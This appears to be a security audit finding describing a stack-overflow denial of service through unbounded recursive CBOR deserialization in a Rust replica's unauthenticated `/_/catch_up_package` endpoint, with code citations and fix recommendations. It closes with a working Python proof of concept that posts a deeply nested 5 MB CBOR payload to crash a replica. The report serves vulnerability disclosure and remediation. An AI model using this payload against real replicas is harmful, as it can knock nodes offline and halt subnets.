### Title
Stack Overflow via Unbounded Recursive CBOR Deserialization in `/_/catch_up_package` Handler — (`rs/http_endpoints/public/src/catch_up_package.rs`)

---

### Summary

The `cup` handler at line 71 of `rs/http_endpoints/public/src/catch_up_package.rs` calls `serde_cbor::from_slice::<CatchUpPackageParam>(&body)` on attacker-controlled bytes with no recursion depth guard. `serde_cbor` uses recursive-descent parsing with no built-in depth limit. When deserializing a flat struct with unknown keys, serde's derived `Deserialize` silently skips unknown field values via `serde::de::IgnoredAny`, which calls `deserializer.deserialize_any(IgnoredAnyVisitor)` — a call that recurses one Rust stack frame per CBOR nesting level. A 5 MB payload of maximally nested CBOR maps (~1.7 M levels at ≈3 bytes/level) exhausts the Tokio worker thread's stack (default 8 MB), causing a SIGSEGV that terminates the replica process.

---

### Finding Description

**Entrypoint:** `POST /_/catch_up_package` with `Content-Type: application/cbor`. No authentication is required.

**Call sequence:**

1. `RequestBodyLimitLayer` (5 MB cap) admits the body. [1](#0-0) 

2. `verify_cbor_content_header` middleware passes (correct content-type). [2](#0-1) 

3. `cup()` handler receives the raw `Bytes` and calls `serde_cbor::from_slice::<CatchUpPackageParam>(&body)` synchronously on the Tokio worker thread — no `spawn_blocking`, no yield point. [3](#0-2) 

4. `CatchUpPackageParam` is a flat two-field struct with no `#[serde(deny_unknown_fields)]`. Unknown keys are silently skipped via `IgnoredAny`. [4](#0-3) 

5. For each unknown key whose value is a nested CBOR map, `serde_cbor` calls `deserialize_any → visit_map → next_value::<IgnoredAny> → deserialize_any → …` — one Rust call-stack frame per nesting level. With 5 MB of CBOR at ≈3 bytes/level (one-element map header `0xA1` + 1-byte key + value), an attacker can produce ≈1.7 M nesting levels, consuming ≈170–340 MB of stack (at 100–200 bytes/frame), far exceeding the 8 MB default.

**Why the global timeout does not help:** The tower `timeout` layer wraps the async future but cannot preempt a synchronous blocking call occupying the thread. The stack overflow occurs in microseconds, long before the 300-second timeout fires. [5](#0-4) 

**Why the concurrency limit does not help:** `max_catch_up_package_concurrent_requests: 100` limits simultaneous in-flight requests but does not prevent a single request from overflowing the stack. [6](#0-5) 

---

### Impact Explanation

A stack overflow on a Tokio worker thread raises SIGSEGV and terminates the replica process. The orchestrator will restart it, but the attacker can immediately re-send the payload, keeping the replica in a crash-restart loop. Targeting multiple replicas in a subnet simultaneously can reduce the number of live replicas below the consensus threshold, halting the subnet.

---

### Likelihood Explanation

The endpoint is unauthenticated and publicly reachable. The payload is trivial to construct (a CBOR one-element map nested inside itself, repeated to fill 5 MB). No special privileges, keys, or network position are required.

---

### Recommendation

1. **Add a CBOR recursion depth limit before deserialization.** Validate that the CBOR payload does not exceed a small fixed depth (e.g., 10) before passing it to `serde_cbor`. The `ciborium` crate supports configurable recursion limits; alternatively, a lightweight pre-scan can reject payloads with nesting depth above a threshold.

2. **Add `#[serde(deny_unknown_fields)]` to `CatchUpPackageParam`.** This causes `serde_cbor` to return an error immediately on the first unknown key rather than recursively skipping its value, eliminating the recursion path entirely for well-formed but unexpected inputs. [4](#0-3) 

3. **Move the deserialization into `spawn_blocking`.** This isolates the blocking call to a dedicated thread with a controlled stack size and prevents starvation of the async executor, though it does not prevent the crash itself.

---

### Proof of Concept

```python
import struct, requests

# Build a 5 MB deeply nested CBOR one-element map:
# 0xA1 = map(1), 0x61 0x61 = text("a"), value = next level
level = b'\x00'  # innermost: integer 0
for _ in range(1_700_000):
    level = b'\xa1\x61\x61' + level  # map(1) {"a": <level>}
    if len(level) >= 5 * 1024 * 1024:
        break

requests.post(
    "http://<replica-ip>:8080/_/catch_up_package",
    data=level[:5*1024*1024],
    headers={"Content-Type": "application/cbor"},
    timeout=30,
)
# Expected: replica process crashes with SIGSEGV (stack overflow)
```

### Citations

**File:** rs/http_endpoints/public/src/lib.rs (L682-682)
```rust
            .timeout(Duration::from_secs(config.request_timeout_seconds))
```

**File:** rs/http_endpoints/public/src/lib.rs (L688-691)
```rust
            .layer(DefaultBodyLimit::disable())
            .layer(RequestBodyLimitLayer::new(
                config.max_request_size_bytes as usize,
            ))
```

**File:** rs/http_endpoints/public/src/catch_up_package.rs (L38-41)
```rust
            axum::routing::post(cup).with_state(state).layer(
                ServiceBuilder::new().layer(axum::middleware::from_fn(verify_cbor_content_header)),
            ),
        )
```

**File:** rs/http_endpoints/public/src/catch_up_package.rs (L61-88)
```rust
async fn cup(
    State(CatchUpPackageService {
        consensus_pool_cache,
    }): State<CatchUpPackageService>,
    body: Bytes,
) -> impl IntoResponse {
    let cup_proto = consensus_pool_cache.cup_as_protobuf();
    if body.is_empty() {
        protobuf_response(&cup_proto)
    } else {
        match serde_cbor::from_slice::<CatchUpPackageParam>(&body) {
            Ok(param) => {
                let cup: CatchUpPackage =
                    (&cup_proto).try_into().expect("deserializing CUP failed");
                if CatchUpPackageParam::from(&cup) > param {
                    protobuf_response(&cup_proto)
                } else {
                    StatusCode::NO_CONTENT.into_response()
                }
            }
            Err(e) => {
                let code = StatusCode::BAD_REQUEST;
                let text = format!("Could not parse body as CatchUpPackage param: {e}");
                (code, text).into_response()
            }
        }
    }
}
```

**File:** rs/types/types/src/consensus/catchup.rs (L318-322)
```rust
#[derive(Copy, Clone, Eq, PartialEq, Debug, Deserialize, Serialize)]
pub struct CatchUpPackageParam {
    height: Height,
    registry_version: RegistryVersion,
}
```

**File:** rs/config/src/http_handler.rs (L48-49)
```rust
    /// Serving at most `max_catch_up_package_concurrent_requests` requests concurrently for endpoint `/_/catch_up_package`.
    pub max_catch_up_package_concurrent_requests: usize,
```
